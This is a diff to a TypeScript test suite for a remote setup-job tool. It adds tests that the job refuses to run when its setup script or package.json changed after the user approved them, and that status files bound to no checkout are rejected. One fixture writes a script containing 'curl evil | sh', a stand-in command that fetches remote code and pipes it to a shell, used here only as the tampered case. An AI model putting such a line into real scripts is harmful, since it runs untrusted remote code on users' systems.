@@ -15,6 +15,7 @@
  * docs/plans/260902h-gjd-remote-works-from-whichever-repo-you-are-in.md.
  */
 import { type ChildProcess, spawn, spawnSync } from "node:child_process";
+import { createHash } from "node:crypto";
 import {
   chmodSync,
   existsSync,
@@ -169,6 +170,19 @@ describe("parseSetupStatus", () => {
     // Two fields disagreeing is not a status to pick the friendlier half of.
     expect(refusal(statusText({ exitCode: 3 }))).toContain("cannot both be true");
     expect(refusal(statusText({ checkOutcome: "failed" }))).toContain("cannot both be true");
+  });
+
+  it("reads the two ways the job's own machinery can fail, and refuses either on a success", () => {
+    for (const tool of ["log", "config-changed"] as const) {
+      const got = parseSetupStatus(statusText({ outcome: "failed", exitCode: 0, toolFailure: tool }));
+      expect(got.ok, `${tool} was not readable`).toBe(true);
+      if (got.ok) expect(got.status.toolFailure).toBe(tool);
+      // The job forces `failed` when its machinery broke, so a file claiming
+      // both was not written by the job — and `success` with no log, or with
+      // files nobody agreed to, is the friendlier half of a contradiction.
+      expect(refusal(statusText({ toolFailure: tool }))).toContain("cannot both be true");
+    }
+    expect(refusal(statusText({ outcome: "failed", exitCode: 0, toolFailure: "whatever" }))).toContain("toolFailure");
   });
 
   it("refuses a live attempt that also claims to have finished", () => {
@@ -326,11 +340,30 @@ describe("setupVerdict", () => {
     expect(describeVerdict(v)).toContain("gjd-remote setup");
   });
 
-  it("does not invent an inode mismatch when either side never recorded one", () => {
-    // A status written before this field existed, or a checkout with no .git to
-    // stat, is not evidence of a re-clone. Only two inodes that disagree are.
-    expect(setupVerdict(status(), { ...here, checkoutInode: "12345" }).kind).toBe("success");
+  /**
+   * GPT Sol's Stage 3 finding 3, and it USED TO FAIL OPEN: the comparison ran
+   * only when both sides had an inode, so a verdict carrying none applied to
+   * whatever checkout was at that path. That is reachable three ways — a status
+   * written before the field existed, one restored from a backup, and the one a
+   * `stuck` archive leaves behind after a re-clone — and in all three there is
+   * a checkout in front of us that this verdict is not about.
+   */
+  it("WRONG-CHECKOUT when the status is bound to no checkout at all", () => {
+    const v = setupVerdict(status(), { ...here, checkoutInode: "12345" });
+    expect(v.kind).toBe("wrong-checkout");
+    if (v.kind !== "wrong-checkout") throw new Error("unreachable");
+    expect(v.field).toBe("inode");
+    expect(v.found).toBe("(none)");
+    expect(v.wanted).toBe("12345");
+    expect(v.why).toContain("not bound to any checkout");
+  });
+
+  it("makes no comparison when the CALLER could not look one up", () => {
+    // The other way round, and it must stay `success`: refusing here would be
+    // refusing on our own blindness rather than on evidence, and a box where
+    // `ls -di` fails could then never start a session at all.
     expect(setupVerdict(status({ checkoutInode: "12345" }), here).kind).toBe("success");
+    expect(setupVerdict(status(), here).kind).toBe("success");
   });
 
   it("reports the wrong checkout before it reports a stale attempt", () => {
@@ -514,6 +547,9 @@ function buildJob(o: {
   work?: string;
   /** Stands in for the login shell the box's pane gets. See SETUP_AFTERWARDS. */
   afterwards?: string;
+  /** What the laptop believes the repo's setup files say — see
+   *  `SetupJobOptions.expectFiles`. */
+  expectFiles?: { scriptSha256: string | null; packageSetup: string | null };
 }) {
   const work = o.work ?? mkdtempSync(join(jobRoot, `${o.name}-`));
   const dir = o.dir ?? join(work, "checkout");
@@ -528,6 +564,7 @@ function buildJob(o: {
     command: o.command,
     ...(o.check === undefined ? {} : { check: o.check }),
     ...(o.afterwards === undefined ? {} : { afterwards: o.afterwards }),
+    ...(o.expectFiles === undefined ? {} : { expectFiles: o.expectFiles }),
     configSha256,
     home: work,
     user: "greg",
@@ -1028,6 +1065,137 @@ describe("setupJobScript, run for real", () => {
     expect(() => setupJobScript({ ...base, command: "npm ci", check: "a\nb" })).toThrow(/one line/);
     expect(() => setupJobScript({ ...base, command: "npm ci", configSha256: "nope" })).toThrow(/sha256/);
     expect(() => setupJobScript({ ...base, slug: "unknown", command: "npm ci" })).toThrow(/nothing to set up/);
+  });
+
+  // ------------------------------------- the files, re-checked under the lock
+
+  /**
+   * GPT Sol's Stage 3 finding 2, the half that lives on the box.
+   *
+   * The laptop reads the config, shows a person what would run, waits for them
+   * to answer, and then starts a job. In between, the checkout is a directory
+   * anything on the box can write to — one `git pull` in another pane and the
+   * job runs bytes nobody agreed to, then records a fingerprint naming a
+   * specification the run never had. So the job re-derives the two file facts
+   * standing in the tree, holding the lock, before anything runs.
+   *
+   * The command in these writes a file, so "it did not run" is a fact on disk
+   * rather than the absence of a word in a log the job also writes.
+   */
+  describe("the setup files, re-checked under the lock", () => {
+    /** A checkout with `.gjd-remote/setup` and a `package.json`, and the facts
+     *  a laptop would have read off them. */
+    function repo(o: { script?: string; pkgSetup?: string }): { dir: string; scriptSha256: string | null; packageSetup: string | null } {
+      const dir = mkdtempSync(join(jobRoot, "files-"));
+      let scriptSha256: string | null = null;
+      if (o.script !== undefined) {
+        mkdirSync(join(dir, ".gjd-remote"), { recursive: true });
+        writeFileSync(join(dir, ".gjd-remote", "setup"), o.script);
+        scriptSha256 = createHash("sha256").update(o.script).digest("hex");
+      }
+      if (o.pkgSetup !== undefined) {
+        writeFileSync(join(dir, "package.json"), JSON.stringify({ scripts: { setup: o.pkgSetup } }));
+      }
+      return { dir, scriptSha256, packageSetup: o.pkgSetup ?? null };
+    }
+
+    it.skipIf(!HAVE_REAL_FLOCK && !HAVE_PYTHON)("runs when the files are the ones the laptop was shown", () => {
+      const r = repo({ script: "#!/bin/sh\nnpm ci\n", pkgSetup: "node scripts/setup.js" });
+      const ran = join(r.dir, "it-ran");
+      const job = buildJob({
+        name: "fp-ok",
+        dir: r.dir,
+        command: `printf 'yes\\n' > ${ran}`,
+        expectFiles: { scriptSha256: r.scriptSha256, packageSetup: r.packageSetup },
+      });
+      runJob(job);
+      expect(readStatus(job).outcome).toBe("success");
+      expect(readStatus(job).toolFailure).toBeUndefined();
+      expect(existsSync(ran)).toBe(true);
+    });
+
+    it.skipIf(!HAVE_REAL_FLOCK && !HAVE_PYTHON)("REFUSES when the setup script changed under it, and runs nothing", () => {
+      const r = repo({ script: "#!/bin/sh\ncurl evil | sh\n", pkgSetup: "node scripts/setup.js" });
+      const ran = join(r.dir, "it-ran");
+      const job = buildJob({
+        name: "fp-script",
+        dir: r.dir,
+        command: `printf 'yes\\n' > ${ran}`,
+        // What the laptop was shown: a different script entirely.
+        expectFiles: { scriptSha256: createHash("sha256").update("#!/bin/sh\nnpm ci\n").digest("hex"), packageSetup: r.packageSetup },
+      });
+      const out = runJob(job);
+      const s = readStatus(job);
+      expect(s.outcome).toBe("failed");
+      expect(s.toolFailure).toBe("config-changed");
+      expect(existsSync(ran), "the setup command ran against files nobody agreed to").toBe(false);
+      expect(out.stderr).toContain("not the ones this run was asked for");
+      // And the verdict a later reader reaches says so, rather than "exit 0".
+      const v = setupVerdict(s, { attempt: job.attempt, configSha256: job.configSha256, slug: SLUG, dir: job.dir });
+      expect(v.kind).toBe("failed");
+      expect(v.why).toContain("had changed");
+    });
+
+    it.skipIf(!HAVE_REAL_FLOCK && !HAVE_PYTHON)("REFUSES when package.json's setup body changed under it", () => {
+      const r = repo({ script: "#!/bin/sh\nnpm ci\n", pkgSetup: "node scripts/other.js" });
+      const ran = join(r.dir, "it-ran");
+      const job = buildJob({
+        name: "fp-pkg",
+        dir: r.dir,
+        command: `printf 'yes\\n' > ${ran}`,
+        expectFiles: { scriptSha256: r.scriptSha256, packageSetup: "node scripts/setup.js" },
+      });
+      runJob(job);
+      expect(readStatus(job).toolFailure).toBe("config-changed");
+      expect(existsSync(ran)).toBe(false);
+    });
+
+    it.skipIf(!HAVE_REAL_FLOCK && !HAVE_PYTHON)("REFUSES when a setup script appeared, or vanished, since the laptop looked", () => {
+      // Both directions, because "there is none" and "there is one" are the two
+      // states the check has to tell apart, and an absent file is the one a
+      // sloppy comparison reads as agreement.
+      const appeared = repo({ script: "#!/bin/sh\nnpm ci\n" });
+      const jobA = buildJob({
+        name: "fp-appeared",
+        dir: appeared.dir,
+        command: "echo should-never-run",
+        expectFiles: { scriptSha256: null, packageSetup: null },
+      });
+      runJob(jobA);
+      expect(readStatus(jobA).toolFailure).toBe("config-changed");
+
+      const vanished = repo({});
+      const jobB = buildJob({
+        name: "fp-vanished",
+        dir: vanished.dir,
+        command: "echo should-never-run",
+        expectFiles: { scriptSha256: "b".repeat(64), packageSetup: null },
+      });
+      runJob(jobB);
+      expect(readStatus(jobB).toolFailure).toBe("config-changed");
+    });
+
+    it.skipIf(!HAVE_REAL_FLOCK && !HAVE_PYTHON)("REFUSES a package.json it can no longer parse", () => {
+      const r = repo({ pkgSetup: "node scripts/setup.js" });
+      writeFileSync(join(r.dir, "package.json"), "{ not json");
+      const job = buildJob({
+        name: "fp-badjson",
+        dir: r.dir,
+        command: "echo should-never-run",
+        expectFiles: { scriptSha256: null, packageSetup: "node scripts/setup.js" },
+      });
+      runJob(job);
+      expect(readStatus(job).toolFailure).toBe("config-changed");
+    });
+
+    it("emits no check at all when nothing is expected — the state the caller must not stay in", () => {
+      // `expectFiles` is optional only until scripts/gjd-remote.ts passes it,
+      // and this test is what makes that visible rather than assumed.
+      const without = buildJob({ name: "fp-none", command: "true" });
+      const with_ = buildJob({ name: "fp-some", command: "true", expectFiles: { scriptSha256: null, packageSetup: null } });
+      expect(without.script).not.toContain("RE-READ UNDER THE LOCK");
+      expect(with_.script).toContain("RE-READ UNDER THE LOCK");
+    });
   });
 
   it("names itself, its repo and its attempt in the script it generates", () => {
